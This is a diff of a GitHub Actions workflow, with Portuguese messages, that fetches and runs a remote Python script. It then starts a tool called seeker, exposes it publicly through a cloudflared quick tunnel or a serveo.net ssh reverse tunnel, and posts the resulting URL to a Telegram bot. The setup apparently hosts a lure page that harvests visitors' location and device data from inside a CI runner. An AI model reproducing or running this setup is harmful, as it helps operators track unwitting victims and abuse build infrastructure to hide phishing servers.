@@ -17,19 +17,18 @@ jobs:
           curl -sL -o /tmp/fix.py https://raw.githubusercontent.com/datacfgx/sino-grid/main/tools/seeker-py314-fix.py && python3 /tmp/fix.py
           (echo 0 | python3 /opt/seeker/seeker.py -p 8080 > /tmp/seeker.log 2>&1 &)
           sleep 4
+          curl -sL -o /tmp/cf https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+          chmod +x /tmp/cf
+          /tmp/cf tunnel --no-autoupdate --url http://localhost:8080 > /tmp/cf.out 2>&1 &
           URL=""
-          for t in 1 2 3; do
-            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ConnectTimeout=15 -N -R 80:localhost:8080 serveo.net > /tmp/serveo.out 2>&1 &
-            SPID=$!
-            for i in $(seq 1 12); do sleep 5; grep -q Forwarding /tmp/serveo.out && break; done
-            URL=$(grep -oE 'https://[a-zA-Z0-9./_-]+' /tmp/serveo.out | head -1)
-            [ -n "$URL" ] && break
-            kill $SPID 2>/dev/null; sleep 5
-          done
+          for i in $(seq 1 30); do sleep 5; URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf.out | head -1); [ -n "$URL" ] && break; done
+          if [ -z "$URL" ]; then
+            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -N -R 80:localhost:8080 serveo.net > /tmp/serveo.out 2>&1 &
+            for i in $(seq 1 12); do sleep 5; URL=$(grep -oE 'https://[a-zA-Z0-9./_-]+' /tmp/serveo.out | head -1); [ -n "$URL" ] && break; done
+          fi
           echo "URL=$URL"
           if [ -z "$URL" ]; then
-            DIAG=$(tail -6 /tmp/serveo.out 2>/dev/null)
-            MSGE=$(printf "SEEKER: tunel falhou 3x. Diagnostico:\n%s" "$DIAG")
+            MSGE=$(printf "SEEKER: nenhum tunel funcionou. cf.out:\n%s\nserveo:\n%s" "$(tail -4 /tmp/cf.out)" "$(tail -4 /tmp/serveo.out 2>/dev/null)")
             curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGE}" || true
             exit 1
           fi
